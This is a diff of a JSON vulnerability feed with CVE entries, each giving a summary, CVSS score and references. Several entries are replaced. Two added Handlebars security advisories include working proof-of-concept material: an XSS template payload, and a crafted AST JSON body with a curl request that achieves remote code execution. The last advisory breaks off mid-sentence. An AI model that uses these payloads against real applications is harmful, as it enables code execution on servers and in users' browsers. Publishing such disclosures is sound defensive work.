-        "http://www.securiteam.com/windowsntfocus/5SP011P4KC.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0113",
-      "summary": "statsconfig.pl in OmniHTTPd 2.07 allows remote attackers to execute arbitrary commands via the mostbrowsers parameter, whose value is used as part of a generated Perl script.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2001-03-12",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2001-01/0248.html",
-        "http://www.securityfocus.com/bid/2211",
-        "http://archives.neohapsis.com/archives/bugtraq/2001-01/0248.html",
-        "http://www.securityfocus.com/bid/2211"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0114",
-      "summary": "statsconfig.pl in OmniHTTPd 2.07 allows remote attackers to overwrite arbitrary files via the cgidir parameter.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2001-03-12",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2001-01/0248.html",
-        "http://www.securityfocus.com/bid/2211",
-        "http://archives.neohapsis.com/archives/bugtraq/2001-01/0248.html",
-        "http://www.securityfocus.com/bid/2211"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0115",
-      "summary": "Buffer overflow in arp command in Solaris 7 and earlier allows local users to execute arbitrary commands via a long -f parameter.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2001-03-12",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=97934312727101&w=2",
-        "http://marc.info/?l=bugtraq&m=97957435729702&w=2",
-        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/200&type=0&nav=sec.sba",
-        "http://www.securityfocus.com/bid/2193",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5928"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0818",
-      "summary": "The default installation for the Oracle listener program 7.3.4, 8.0.6, and 8.1.6 allows an attacker to cause logging information to be appended to arbitrary files and execute commands via the SET TRC_FILE or SET LOG_FILE commands.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2000-12-19",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://otn.oracle.com/deploy/security/pdf/listener_alert.pdf",
-        "http://xforce.iss.net/alerts/advise66.php",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5380",
-        "http://otn.oracle.com/deploy/security/pdf/listener_alert.pdf",
-        "http://xforce.iss.net/alerts/advise66.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-0035",
-      "summary": "SQL injection vulnerability in register.php for Phorum 3.4.5 and earlier allows remote attackers to execute arbitrary SQL commands via the hide_email parameter.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2004-01-20",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=107340481804110&w=2",
-        "http://secunia.com/advisories/10567",
-        "http://www.osvdb.org/3508",
-        "http://www.securityfocus.com/bid/9363",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/14146"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-0036",
-      "summary": "SQL injection vulnerability in calendar.php for vBulletin Forum 2.3.x before 2.3.4 allows remote attackers to steal sensitive information via the eventid parameter.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2004-01-20",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=107340358202123&w=2",
-        "http://www.osvdb.org/3344",
-        "http://www.securityfocus.com/bid/9360",
-        "http://www.vbulletin.com/forum/showthread.php?postid=588825",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/14144"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-0037",
-      "summary": "FirstClass Desktop Client 7.1 allows remote attackers to execute arbitrary commands via hyperlinks in FirstClass RTF messages.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2004-01-20",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=107340950611167&w=2",
-        "http://secunia.com/advisories/10556",
-        "http://www.osvdb.org/3442",
-        "http://www.securityfocus.com/bid/9370",
-        "http://www.securitytracker.com/id?1008609"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-1766",
-      "summary": "The default installation of NetScreen-Security Manager before Feature Pack 1 does not enable encryption for communication with devices running ScreenOS 5.0, which allows remote attackers to obtain sensitive information via sniffing.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2004-01-20",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://secunia.com/advisories/10675",
-        "http://www.juniper.net/support/security/alerts/58290.txt",
-        "http://www.kb.cert.org/vuls/id/927630",
-        "http://www.kb.cert.org/vuls/id/CRDY-5VEU8N",
-        "http://www.netscreen.com/services/security/alerts/1_19_04_58290.jsp"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-0545",
-      "summary": "LVM for AIX 5.1 and 5.2 allows local users to overwrite arbitrary files via a symlink attack.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2004-08-06",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www-1.ibm.com/services/continuity/recover1.nsf/mss/MSS-OAR-E01-2004.0544.2",
-        "http://www.ciac.org/ciac/bulletins/o-131.shtml",
-        "http://www.securityfocus.com/bid/10230",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16011",
-        "http://www-1.ibm.com/services/continuity/recover1.nsf/mss/MSS-OAR-E01-2004.0544.2"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-0547",
-      "summary": "Buffer overflow in the ODBC driver for PostgreSQL before 7.2.1 allows remote attackers to cause a denial of service (crash).",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2004-08-06",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.debian.org/security/2004/dsa-516",
-        "http://www.mandrakesecure.net/en/advisories/advisory.php?name=MDKSA-2004:072",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16329",
-        "http://www.debian.org/security/2004/dsa-516",
-        "http://www.mandrakesecure.net/en/advisories/advisory.php?name=MDKSA-2004:072"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0008",
-      "summary": "Buffer overflow in NIS+, in Sun's rpc.nisd program.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "1998-06-08",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/170",
-        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/170"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-1479",
-      "summary": "The textcounter.pl by Matt Wright allows remote attackers to execute arbitrary commands via shell metacharacters.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "1998-06-24",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securityfocus.com/archive/1/9609",
-        "http://www.securityfocus.com/bid/2265",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/2052",
-        "http://www.securityfocus.com/archive/1/9609",
-        "http://www.securityfocus.com/bid/2265"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-0351",
-      "summary": "Spider Sales shopping cart stores the private key in the same database and table as the public key, which allows local users with access to the database to decrypt data.",
-      "cvssScore": 2.1,
-      "severity": "Low",
-      "published": "2004-11-23",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://lists.grok.org.uk/pipermail/full-disclosure/2004-March/018177.html",
-        "http://marc.info/?l=bugtraq&m=107833097705486&w=2",
-        "http://www.securityfocus.com/bid/9799",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/15370",
-        "http://lists.grok.org.uk/pipermail/full-disclosure/2004-March/018177.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-0352",
-      "summary": "Cisco 11000 Series Content Services Switches (CSS) running WebNS 5.0(x) before 05.0(04.07)S, and 6.10(x) before 06.10(02.05)S allow remote attackers to cause a denial of service (device reset) via a malformed packet to UDP port 5002.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2004-11-23",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.cisco.com/warp/public/707/cisco-sa-20040304-css.shtml",
-        "http://www.kb.cert.org/vuls/id/363374",
-        "http://www.securityfocus.com/bid/9806",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/15388",
-        "http://www.cisco.com/warp/public/707/cisco-sa-20040304-css.shtml"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0432",
-      "summary": "Buffer overflows in various CGI programs in the remote administration service for Trend Micro Interscan VirusWall 3.01 allow remote attackers to execute arbitrary commands.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2001-07-02",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2001-04/0218.html",
-        "http://www.securityfocus.com/bid/2579",
-        "http://archives.neohapsis.com/archives/bugtraq/2001-04/0218.html",
-        "http://www.securityfocus.com/bid/2579"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0434",
-      "summary": "The LogDataListToFile ActiveX function used in (1) Knowledge Center and (2) Back web components of Compaq Presario computers allows remote attackers to modify arbitrary files and cause a denial of service.",
-      "cvssScore": 6.4,
-      "severity": "Medium",
-      "published": "2001-07-02",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://ftp.support.compaq.com/patches/.new/html/SSRT0716-01.shtml",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6355",
-        "http://ftp.support.compaq.com/patches/.new/html/SSRT0716-01.shtml",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6355"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-1560",
-      "summary": "Vulnerability in a script in Texas A&M University (TAMU) Tiger allows local users to execute arbitrary commands as the Tiger user, usually root.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "1999-07-20",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=93252050203589&w=2",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/2369",
-        "http://marc.info/?l=bugtraq&m=93252050203589&w=2",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/2369"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0810",
-      "summary": "Denial of service in Samba NETBIOS name service daemon (nmbd).",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "1999-07-21",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0810",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0810"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0811",
-      "summary": "Buffer overflow in Samba smbd program via a malformed message command.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "1999-07-21",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securityfocus.com/bid/536",
-        "http://www.securityfocus.com/bid/536"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-1165",
-      "summary": "GNU fingerd 1.37 does not properly drop privileges before accessing user information, which could allow local users to (1) gain root privileges via a malicious program in the .fingerrc file, or (2) read arbitrary files via symbolic links from .plan, .forward, or .project files.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "1999-07-21",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=93268249021561&w=2",
-        "http://www.securityfocus.com/archive/1/2478",
-        "http://www.securityfocus.com/bid/535",
-        "http://marc.info/?l=bugtraq&m=93268249021561&w=2",
-        "http://www.securityfocus.com/archive/1/2478"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-1338",
-      "summary": "Delegate proxy 5.9.3 and earlier creates files and directories in the DGROOT with world-writable permissions.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "1999-07-21",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=93259112204664&w=2",
-        "http://marc.info/?l=bugtraq&m=93259112204664&w=2"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0964",
-      "summary": "Buffer overflow in FreeBSD setlocale in the libc module allows attackers to execute arbitrary code via a long PATH_LOCALE environment variable.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2000-01-01",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.osvdb.org/6086",
-        "http://www.osvdb.org/6086"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0069",
-      "summary": "The recover program in Solstice Backup allows local users to restore sensitive files.",
-      "cvssScore": 2.1,
-      "severity": "Low",
-      "published": "2000-01-01",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-2000-0069",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-2000-0069"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0866",
-      "summary": "Interbase 6 SuperServer for Linux allows an attacker to cause a denial of service via a query containing 0 bytes.",
-      "cvssScore": 2.1,
-      "severity": "Low",
-      "published": "2000-11-14",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-09/0027.html",
-        "http://www.securityfocus.com/bid/1654",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5205",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-09/0027.html",
-        "http://www.securityfocus.com/bid/1654"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-69206",
-      "summary": "The `DigestAuth` replay defence stores `lastNc + 1` rather than the nonce-count (`nc`) value it just accepted. When a legitimate client sends non-contiguous `nc` values (parallel or retried requests, as browsers do), the server's counter lags behind the highest `nc` seen, and a captured `Authorization` header can be replayed multiple times.\n\n## Impact\n\nA passive observer can turn one captured Digest-authenticated request into several replayed authenticated (state-changing) requests, defeating the core\nreplay protection Digest provides over Basic.\n\n## Preconditions\n\n- Application uses `DigestAuth`.\n- Attacker can passively observe at least one legitimate digest request.\n- Legitimate client emits an `nc` more than one greater than the last, for instance from a parallel or retried request.\n\n## Workarounds\n\n- Deploy over TLS so requests cannot be captured.",
-      "cvssScore": 5.9,
-      "severity": "Medium",
-      "published": "2026-09-15",
-      "modified": "2026-09-15",
-      "cwe": {
-        "cwe_id": "CWE-294",
-        "name": "Authentication Bypass by Capture-replay"
-      },
-      "references": [
-        "https://github.com/http4s/http4s/security/advisories/GHSA-9xww-74xv-gjfp",
-        "https://github.com/http4s/http4s/commit/7f065101c45f3d86bc105e8fc6323c2c4a11471f",
-        "https://github.com/http4s/http4s/releases/tag/v0.23.35",
-        "https://github.com/http4s/http4s/releases/tag/v1.0.0-M47",
-        "https://github.com/advisories/GHSA-9xww-74xv-gjfp"
-      ],
-      "vulnerableProducts": [
-        "org.http4s:http4s-ember-core_2.12 maven",
-        "org.http4s:http4s-ember-core_2.13 maven",
-        "org.http4s:http4s-ember-core_3 maven"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1308",
-      "summary": "Heap-based buffer overflow in Netscape and Mozilla allows remote attackers to execute arbitrary code via a jar: URL that references a malformed .jar file, which overflows a buffer during decompression.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-11-29",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://bugzilla.mozilla.org/show_bug.cgi?id=157646",
-        "http://marc.info/?l=bugtraq&m=103730181813075&w=2",
-        "http://www.redhat.com/support/errata/RHSA-2003-162.html",
-        "http://www.redhat.com/support/errata/RHSA-2003-163.html",
-        "http://www.securityfocus.com/bid/6185"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0282",
-      "summary": "TalentSoft webpsvr daemon in the Web+ shopping cart application allows remote attackers to read arbitrary files via a .. (dot dot) attack on the webplus CGI program.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2000-04-12",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "ftp://ftp.talentsoft.com/Download/Webplus/Unix/Patches/Webplus46p%20Read%20me.html",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-04/0050.html",
-        "http://www.securityfocus.com/bid/1102",
-        "ftp://ftp.talentsoft.com/Download/Webplus/Unix/Patches/Webplus46p%20Read%20me.html",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-04/0050.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0283",
-      "summary": "The default installation of IRIX Performance Copilot allows remote attackers to access sensitive system information via the pmcd daemon.",
-      "cvssScore": 6.4,
-      "severity": "Medium",
-      "published": "2000-04-12",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-04/0056.html",
-        "http://www.securityfocus.com/bid/1106",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-04/0056.html",
-        "http://www.securityfocus.com/bid/1106"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-1837",
-      "summary": "Cross-site scripting (XSS) vulnerability in Mod_survey 3.0.x before 3.0.16-pre2 and 3.2.x before 3.2.0-pre4 allows remote attackers to inject arbitrary web script or HTML via the certain survey fields or error messages for malformed query strings.",
-      "cvssScore": 4.3,
-      "severity": "Medium",
-      "published": "2004-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=107997967421972&w=2",
-        "http://securitytracker.com/id?1009516",
-        "http://www.securityfocus.com/bid/9941",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/15582",
-        "http://marc.info/?l=bugtraq&m=107997967421972&w=2"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-89691",
-      "summary": "In the Linux kernel, the following vulnerability has been resolved:\n\nnfsd: clear opcnt on compound arg release to prevent OOB read\n\nnfsd4_release_compoundargs() resets args->ops to the inline iops[8]\narray when the dynamically-allocated ops buffer is freed, but leaves\nargs->opcnt at its original value (which can be up to 200 for NFSv4.1+\ncompounds).\n\nIf rq_status_counter is stuck at an odd value (which can happen when\nnfsd_dispatch() hits an error path after setting it odd), the RPC\nstatus dumpit handler reads min(opcnt, 16) entries from args->ops[].\nSince iops only has 8 elements and is the last field in struct\nnfsd4_compoundargs, reading indices 8-15 accesses adjacent slab memory\nand leaks it to userspace via netlink.\n\nZero opcnt unconditionally in nfsd4_release_compoundargs() so stale\ncompound metadata is never exposed through the status interface.\n\n[ cel: Remove the kvfree_rcu_mightsleep() sleep from the exposure window ]",
+      "id": "CVE-2026-90556",
+      "summary": "Freeciv versions before 3.2.6 contain a heap buffer overflow in worklist_load() when processing savegame files with declared worklist lengths exceeding the fixed array bound of 64 elements. Attackers can craft malicious savegame files that write past the entries array into adjacent heap-allocated struct fields, potentially corrupting memory when a user or server operator loads the file.",
       "cvssScore": 6.1,
       "severity": "Medium",
-      "published": "2026-09-11",
-      "modified": "2026-09-13",
+      "published": "2026-09-12",
+      "modified": "2026-09-12",
       "cwe": null,
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-89691",
-        "https://git.kernel.org/stable/c/58bcdfb2b2e412088839ae740b1a95154dc0b8d0",
-        "https://git.kernel.org/stable/c/ae4c38555e81563b8dc5eae55ffd70f0ea97aa5a",
-        "https://git.kernel.org/stable/c/c1a4f7b1848f95302df598217e1c7a1410c2d0c5",
-        "https://git.kernel.org/stable/c/e879148867bd4c4cac42e063ffaffa187dddc6fe"
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-90556",
+        "https://github.com/freeciv/freeciv/commit/75ecde3e86ddf2fe775768450e9a290a4f4d4387",
+        "https://github.com/freeciv/freeciv",
+        "https://github.com/freeciv/freeciv/blob/R3_2_5/server/savegame/savegame2.c#L788",
+        "https://github.com/freeciv/freeciv/blob/R3_2_5/server/savegame/savegame3.c#L964"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-2156",
-      "summary": "Buffer overflow in Trillian 0.73 allows remote IRC servers to execute arbitrary code via a long PING response.",
+      "id": "CVE-2000-1242",
+      "summary": "The HTTP service in American Power Conversion (APC) PowerChute uses a default username and password, which allows remote attackers to gain system access.",
+      "cvssScore": 9,
+      "severity": "Critical",
+      "published": "2000-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php",
+        "http://www.osvdb.org/30768",
+        "http://governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php",
+        "http://www.osvdb.org/30768"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1566",
+      "summary": "Buffer overflow in iParty server 1.2 and earlier allows remote attackers to cause a denial of service (crash) by connecting to default port 6004 and sending repeated extended characters.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1999-05-08",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/archive/1/13600",
+        "http://www.securityfocus.com/archive/1/13600"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0806",
+      "summary": "Buffer overflow in Solaris dtprintinfo program.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "1999-05-10",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.osvdb.org/6552",
+        "http://www.osvdb.org/6552"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0754",
+      "summary": "The INN inndstart program allows local users to gain privileges by specifying an alternate configuration file using the INNCONF environmental variable.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1999-05-11",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://ftp.caldera.com/pub/security/OpenLinux/CSSA-1999-011.0.txt",
+        "http://www.redhat.com/corp/support/errata/inn99_05_22.html",
+        "http://www.securityfocus.com/bid/255",
+        "ftp://ftp.caldera.com/pub/security/OpenLinux/CSSA-1999-011.0.txt",
+        "http://www.redhat.com/corp/support/errata/inn99_05_22.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-106444",
+      "summary": "## Summary\n\n`Handlebars.precompile()` generates JavaScript source that is commonly embedded in browser `<script>` elements. Before the fix, static template text containing `</script>` was emitted unchanged. HTML parsers recognize `</script>` even inside a JavaScript string literal, closing the surrounding script element and allowing following attacker-controlled markup to be parsed and executed.\n\nThis affects applications that precompile attacker-controlled templates and embed the generated source directly in an HTML `<script>` element. It does not affect ordinary server-side rendering or precompiled templates delivered as external JavaScript files.\n\n## Details\n\nStatic text is serialized by `quotedString()` in `lib/handlebars/compiler/code-gen.js`. The generated JavaScript is valid, but JavaScript quoting alone does not make it safe to embed in HTML. In HTML script data, the sequence `</script>` terminates the element regardless of JavaScript string context.\n\nOn affected releases, this template:\n\n```handlebars\nsafe</script><script>alert(\"XSS\")</script><script>\n```\n\ncould produce generated source containing:\n\n```js\nreturn 'safe</script><script>alert(\"XSS\")</script><script>';\n```\n\nWhen included inline in an HTML document, the first `</script>` closes the script containing the precompiled template. The next `<script>` element is then parsed as HTML and executes.\n\n## Proof of Concept\n\n```js\nconst Handlebars = require('handlebars');\n\nconst template = 'safe</script><script>alert(\"XSS\")</script><script>';\nconst output = Handlebars.precompile(template);\n\nconsole.log(output.includes('</script>'));\n```\n\nAffected versions print `true`. Embedding `output` directly in an inline `<script>` element allows the injected script tag to be parsed by the browser.\n\n## Workarounds\n\n- Do not inline precompiled output from untrusted templates into HTML documents.\n- Serve generated precompiled templates as external JavaScript files where practical.\n\n## Credits\n\nReported by Curly-Haired-Baboon Aka Laplas",
+      "cvssScore": 4.7,
+      "severity": "Medium",
+      "published": "2026-10-08",
+      "modified": "2026-10-08",
+      "cwe": {
+        "cwe_id": "CWE-116",
+        "name": "Improper Encoding or Escaping of Output"
+      },
+      "references": [
+        "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-xw65-4hp5-5hc7",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-106444",
+        "https://github.com/handlebars-lang/handlebars.js/pull/2185",
+        "https://github.com/handlebars-lang/handlebars.js/commit/609d1b11c833c9a3e00f56f2f34d22f425446725",
+        "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10"
+      ],
+      "vulnerableProducts": [
+        "handlebars npm"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-106446",
+      "summary": "## Summary\n\n`Handlebars.compile()` and `Handlebars.precompile()` accept a pre-parsed AST as well as a template string. Handlebars 4.7.9 added validation for such ASTs. It only checks values on `PathExpression`, `NumberLiteral` and `BooleanLiteral` nodes, and the compiler still writes several other AST values into the generated JavaScript unchecked.\n\nIf an application passes an untrusted object to `compile()` or `precompile()`, such as a parsed JSON request body, that object can carry arbitrary JavaScript. With `compile()`, the code runs on the server when the template renders. With `precompile()`, it ends up in the precompiled output and runs wherever that output is loaded.\n\nApplications that only ever pass template **strings** are not affected.\n\nThis bypasses the AST validation added in 4.7.9 for GHSA-2w6w-674q-4c4q, GHSA-xhpv-hc6g-r9c6 and GHSA-3mfm-83xf-c92r.\n\n## Details\n\nThe 4.7.9 validator runs in `parseWithoutProcessing()` and walks the whole AST. It only checks values on nodes whose `type` is `PathExpression`, `NumberLiteral` or `BooleanLiteral`. It passes over plain objects without a `type`, and over strings and other non-object values. The compiler reads these values from other places and writes them into the generated code as-is:\n\n| AST value | Written into generated code as | Compile options needed |\n| --- | --- | --- |\n| `Program.blockParams.length` | `container.program(<index>, data, <length>)` | none (default options) |\n| `depth` on a param that is not a `PathExpression`, e.g. a `StringLiteral` | `depths[<depth>]` | `stringParams: true` |\n| A `StringLiteral.value` that is not a string | raw JavaScript literal | `stringParams: true` |\n| A `PathExpression.original` that is not a string | raw JavaScript literal | `stringParams: true` |\n\nThe first row works with default options. A `Program` with `blockParams: { \"length\": \"<JS expression>\" }` passes validation because:\n\n1. the `blockParams` object has no `type`, so none of the type-specific checks apply, and\n2. the walker skips the string under `length` because it is not an object.\n\nThe compiler then reads `program.blockParams.length` and writes the string directly into the template function. The `container.program(...)` call is part of the helper options object, which is built before the helper is looked up. The code therefore runs on render even if the block's helper does not exist.\n\n## Proof of Concept\n\n1. Start a server that compiles request input:\n\n```js\nimport express from \"express\";\nimport Handlebars from \"handlebars\";\n\nconst app = express();\napp.use(express.json());\n\napp.post(\"/api/render\", (req, res) => {\n  const template = Handlebars.compile(req.body.text); // `text` may be an object, not a string\n  res.send(template());\n});\n\napp.listen(2123);\n```\n\n2. Save this request body as `poc.json`. `missingHelper` does not need to exist:\n\n```json\n{\n  \"text\": {\n    \"type\": \"Program\",\n    \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } },\n    \"body\": [\n      {\n        \"type\": \"BlockStatement\",\n        \"path\": {\n          \"type\": \"PathExpression\", \"data\": false, \"depth\": 0,\n          \"parts\": [\"missingHelper\"], \"original\": \"missingHelper\",\n          \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n        },\n        \"params\": [],\n        \"program\": {\n          \"type\": \"Program\",\n          \"blockParams\": {\n            \"length\": \"(()=>{throw new Error('Injected code ran as uid ' + process.getuid())})()\"\n          },\n          \"body\": [],\n          \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n        },\n        \"openStrip\": { \"open\": false, \"close\": false },\n        \"inverseStrip\": { \"open\": false, \"close\": false },\n        \"closeStrip\": { \"open\": false, \"close\": false },\n        \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n      }\n    ]\n  }\n}\n```\n\n3. Send the request:\n\n```sh\ncurl -s -X POST 'http://127.0.0.1:2123/api/render' \\\n     -H 'Content-Type: application/json' --data-binary @poc.json\n```\n\nThe server responds with HTTP 500 and an error page showing the injected code ran inside the Node.js process:\n\n```\nError: Injected code ran as uid 1000\n```\n\n## Impact\n\nAn application is affected if untrusted input can reach `Handlebars.compile()` or `Handlebars.precompile()` as an object instead of a string. A common way this happens is passing a field from a JSON request body straight to `compile()`.\n\n- **`compile()`**: arbitrary JavaScript runs in the Node.js process with the application's privileges (remote code execution).\n- **`precompile()`**: the injected code is written into the precompiled template and runs wherever that template is loaded, for example in users' browsers.\n\n## Workarounds\n\n- **Validate input type** before calling `Handlebars.compile()`: ensure the argument is always a  `string`, never a plain object or JSON-deserialized 